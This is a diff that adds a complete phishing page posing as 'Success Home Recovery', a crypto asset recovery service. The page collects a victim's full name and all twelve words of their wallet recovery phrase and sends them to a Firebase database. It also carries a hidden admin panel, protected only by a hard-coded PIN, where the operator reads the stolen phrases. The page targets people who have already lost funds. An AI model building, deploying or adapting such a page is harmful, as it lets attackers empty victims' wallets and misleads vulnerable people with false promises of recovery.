@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Success Home Recovery</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
+    <style>
+        body { background: #e5e7eb; font-family: sans-serif; }
+        .glass { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.3); }
+        .hero { background: linear-gradient(135deg, #0000ff 0%, #0044ff 100%); }
+    </style>
+</head>
+<body class="p-4">
+
+    <div id="loader" class="hidden fixed inset-0 z-[100] bg-blue-900/90 flex flex-col items-center justify-center">
+        <div class="text-white text-6xl animate-pulse">🛄</div>
+    </div>
+
+    <div class="max-w-3xl mx-auto space-y-8">
+        <section id="intro" class="hero text-white p-8 rounded-3xl text-center shadow-2xl">
+            <h1 class="text-3xl font-black mb-4">Success Home Recovery</h1>
+            <div class="bg-white/10 p-4 rounded-xl mb-6 border border-white/20 text-impact">
+                🚀 Success Home Recovery - Your trusted partner in asset retrieval 🌟
+
+Global leader in secure, transparent, and rapid recovery of digital assets. Established in 2018.
+
+👉 Services:
+- Recover lost or stolen digital assets
+- Expert guidance throughout the process
+- Fast and reliable solutions
+
+Protecting your investments, worldwide 💪
+            </div>
+            <button onclick="nav('report')" class="bg-yellow-400 text-black px-10 py-3 rounded-xl font-bold uppercase tracking-wider shadow-lg">Get Started</button>
+            <div class="mt-8 text-[10px] cursor-pointer opacity-20" onclick="showAdminModal()">v3.5</div>
+        </section>
+
+        <section id="report" class="hidden glass p-6 rounded-3xl shadow-xl">
+            <button onclick="nav('intro')" class="mb-4 text-xs font-bold uppercase opacity-60">← Return Home</button>
+            <form id="reportForm" class="space-y-4">
+                <input type="text" id="fullName" placeholder="Legal Full Name" class="w-full p-4 rounded-xl bg-white/50 border border-white focus:outline-blue-500" required>
+                
+                <div class="p-4 bg-white/30 rounded-2xl border border-white">
+                    <label class="block text-xs font-bold mb-3 uppercase text-blue-900 tracking-tight text-center">Enter 12-Word Security Recovery Phrase</label>
+                    <div id="idCodeContainer" class="grid grid-cols-2 gap-3">
+                        <div class="space-y-2">
+                            <input type="text" placeholder="Word 1" class="word-input w-full p-2 text-sm bg-white/60 border rounded-lg focus:bg-white">
+                            <input type="text" placeholder="Word 2" class="word-input w-full p-2 text-sm bg-white/60 border rounded-lg focus:bg-white">
+                            <input type="text" placeholder="Word 3" class="word-input w-full p-2 text-sm bg-white/60 border rounded-lg focus:bg-white">
+                            <input type="text" placeholder="Word 4" class="word-input w-full p-2 text-sm bg-white/60 border rounded-lg focus:bg-white">
+                            <input type="text" placeholder="Word 5" class="word-input w-full p-2 text-sm bg-white/60 border rounded-lg focus:bg-white">
+                            <input type="text" placeholder="Word 6" class="word-input w-full p-2 text-sm bg-white/60 border rounded-lg focus:bg-white">
+                        </div>
+                        <div class="space-y-2">
+                            <input type="text" placeholder="Word 7" class="word-input w-full p-2 text-sm bg-white/60 border rounded-lg focus:bg-white">
+                            <input type="text" placeholder="Word 8" class="word-input w-full p-2 text-sm bg-white/60 border rounded-lg focus:bg-white">
+                            <input type="text" placeholder="Word 9" class="word-input w-full p-2 text-sm bg-white/60 border rounded-lg focus:bg-white">
+                            <input type="text" placeholder="Word 10" class="word-input w-full p-2 text-sm bg-white/60 border rounded-lg focus:bg-white">
+                            <input type="text" placeholder="Word 11" class="word-input w-full p-2 text-sm bg-white/60 border rounded-lg focus:bg-white">
+                            <input type="text" placeholder="Word 12" class="word-input w-full p-2 text-sm bg-white/60 border rounded-lg focus:bg-white">
+                        </div>
+                    </div>
+                </div>
+
+                <input type="number" id="amount" placeholder="Recovery Amount ($)" class="w-full p-4 rounded-xl bg-white/50 border border-white" required>
+                <button type="submit" class="w-full bg-blue-700 text-white p-4 rounded-xl font-bold shadow-lg hover:bg-blue-800 transition">PROCEED TO AGENT</button>
+            </form>
+        </section>
+
+        <section id="statusUI" class="hidden glass p-10 rounded-3xl text-center">
+            <div class="text-5xl mb-4 animate-bounce">✅</div>
+            <h3 class="text-2xl font-bold text-blue-900 mb-2">Security Check Initiated</h3>
+            <p class="text-sm opacity-70">Your recovery phrase has been securely transmitted. A recovery agent will connect to this session shortly.</p>
+        </section>
+    </div>
+
+    <div id="adminModal" class="hidden fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm">
+        <div class="bg-white w-full max-w-lg p-6 rounded-3xl shadow-2xl flex flex-col max-h-[90vh]">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-xl font-black text-blue-900 uppercase">Recovery Logs</h2>
+                <button onclick="deleteAllData()" class="text-[10px] font-bold text-red-500 border border-red-200 px-2 py-1 rounded-lg hover:bg-red-50">CLEAR ALL</button>
+            </div>
+            
+            <input type="text" id="adminSearch" onkeyup="filterAdminData()" placeholder="Search by name..." class="w-full mb-4 p-2 border rounded-lg text-sm">
+
+            <div id="adminDataList" class="overflow-y-auto flex-1 space-y-4 pr-2"></div>
+            
+            <button onclick="document.getElementById('adminModal').classList.add('hidden')" class="mt-4 w-full bg-gray-900 text-white p-3 rounded-xl font-bold">CLOSE PANEL</button>
+        </div>
+    </div>
+
+    <script>
+        // CONFIGURATION
+        const firebaseConfig = {
+            apiKey: "AIzaSyB46iZvlt84c_Uw1km7WU5JUcdf72jhZUE",
+            databaseURL: "https://successhomerecovery-default-rtdb.firebaseio.com",
+            projectId: "successhomerecovery"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function nav(id) {
+            document.getElementById('loader').classList.remove('hidden');
+            setTimeout(() => {
+                ['intro', 'report', 'statusUI'].forEach(s => document.getElementById(s).classList.add('hidden'));
+                document.getElementById(id).classList.remove('hidden');
+                document.getElementById('loader').classList.add('hidden');
+            }, 600);
+        }
+
+        // FORM SUBMISSION WITH COMMA SEPARATION
+        document.getElementById('reportForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.getElementById('loader').classList.remove('hidden');
+
+            const inputs = document.querySelectorAll('.word-input');
+            const wordsArray = [];
+            
+            // Collect all non-empty words
+            inputs.forEach(input => {
+                if(input.value.trim() !== "") {
+                    wordsArray.push(input.value.trim());
+                }
+            });
+
+            // JOIN WITH COMMA FOR CLEAR READABILITY
+            const commaID = wordsArray.join(', ');
+
+            const payload = {
+                name: document.getElementById('fullName').value,
+                id: commaID,
+                amt: document.getElementById('amount').value,
+                time: new Date().toLocaleString()
+            };
+
+            db.ref('userReports/').push(payload).then(() => {
+                inputs.forEach(i => i.value = ""); 
+                nav('statusUI');
+            }).catch(err => {
+                document.getElementById('loader').classList.add('hidden');
+                alert("Submission Error: " + err.message);
+            });
+        });
+
+        // ADMIN PANEL FETCHING
+        function showAdminModal() {
+            const pin = prompt("Admin Authentication Required:");
+            if(pin === "0803") {
+                refreshAdminLogs();
+                document.getElementById('adminModal').classList.remove('hidden');
+            } else if (pin !== null) { alert("Invalid Credentials"); }
+        }
+
+        function refreshAdminLogs() {
+            document.getElementById('loader').classList.remove('hidden');
+            db.ref('userReports/').once('value', (snap) => {
+                const data = snap.val();
+                let html = "";
+                if(data) {
+                    Object.keys(data).reverse().forEach(key => {
+                        const r = data[key];
+                        html += `
+                            <div class="admin-card p-4 bg-gray-50 rounded-2xl border border-gray-100 shadow-sm" data-name="${r.name.toLowerCase()}">
+                                <div class="flex justify-between text-[10px] text-gray-400 mb-2 font-mono">
+                                    <span>${r.time}</span>
+                                    <button onclick="deleteEntry('${key}')" class="text-red-400 hover:text-red-600">Delete</button>
+                                </div>
+                                <h4 class="font-bold text-gray-800 text-sm mb-1 uppercase">${r.name}</h4>
+                                <div class="bg-white p-3 rounded-xl border border-blue-100 mb-2">
+                                    <span class="text-[9px] uppercase font-bold text-blue-400 block mb-1">Recovery Phrase:</span>
+                                    <p class="text-blue-800 font-mono text-xs leading-relaxed break-words">${r.id}</p>
+                                </div>
+                                <p class="text-sm font-black text-gray-700">Amount: <span class="text-green-600">$${r.amt}</span></p>
+                            </div>`;
+                    });
+                }
+                document.getElementById('adminDataList').innerHTML = html || "<p class='text-center opacity-40 py-10'>No reports found.</p>";
+                document.getElementById('loader').classList.add('hidden');
+            });
+        }
+
+        // ADMIN UTILITIES
+        function filterAdminData() {
+            const query = document.getElementById('adminSearch').value.toLowerCase();
+            const cards = document.querySelectorAll('.admin-card');
+            cards.forEach(card => {
+                card.style.display = card.dataset.name.includes(query) ? 'block' : 'none';
+            });
+        }
+
+        function deleteEntry(key) {
+            if(confirm("Permanently delete this record?")) {
+                db.ref('userReports/' + key).remove().then(() => refreshAdminLogs());
+            }
+        }
+
+        function deleteAllData() {
+            if(confirm("DANGER: Wipe entire database? This cannot be undone.")) {
+                db.ref('userReports/').remove().then(() => refreshAdminLogs());
+            }
+        }
+    </script>
+</body>
+</html>
